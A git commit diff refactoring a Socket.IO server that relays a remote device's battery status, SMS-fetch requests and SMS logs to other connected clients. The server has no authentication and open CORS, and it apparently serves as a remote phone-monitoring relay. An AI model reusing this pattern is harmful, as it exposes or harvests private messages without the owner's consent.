8aa4b819ee23bae49189690caf0e4ed85f2c48b0
sekharathome <58811293+sekharathome@users.noreply.github.com>
2026-01-18 10:20:26 +0530

    Update server.js

--- server.js
+++ server.js
@@ -10,25 +10,10 @@ const io = new Server(server, { cors: { origin: "*" } });
 app.use(express.static(path.join(__dirname, 'public')));
 
 io.on('connection', (socket) => {
-    // Forward battery
-    socket.on('battery-status', (data) => {
-        socket.broadcast.emit('ui-battery', data);
-    });
-
-    // Handle SMS Request
-    socket.on('get-sms-request', () => {
-        socket.broadcast.emit('get-sms-request');
-    });
-
-    // Forward SMS Data
-    socket.on('sms-data-log', (data) => {
-        socket.broadcast.emit('ui-sms-display', data);
-    });
-
-    socket.on('disconnect', () => {
-        socket.broadcast.emit('device-status', { online: false });
-    });
+    socket.on('battery-status', (data) => socket.broadcast.emit('ui-battery', data));
+    socket.on('get-sms-request', () => socket.broadcast.emit('get-sms-request'));
+    socket.on('sms-data-log', (data) => socket.broadcast.emit('ui-sms-display', data));
+    socket.on('disconnect', () => socket.broadcast.emit('device-status', { online: false }));
 });
 
-const PORT = process.env.PORT || 3000;
-server.listen(PORT, '0.0.0.0', () => console.log(`Server Active on ${PORT}`));
+server.listen(process.env.PORT || 3000);
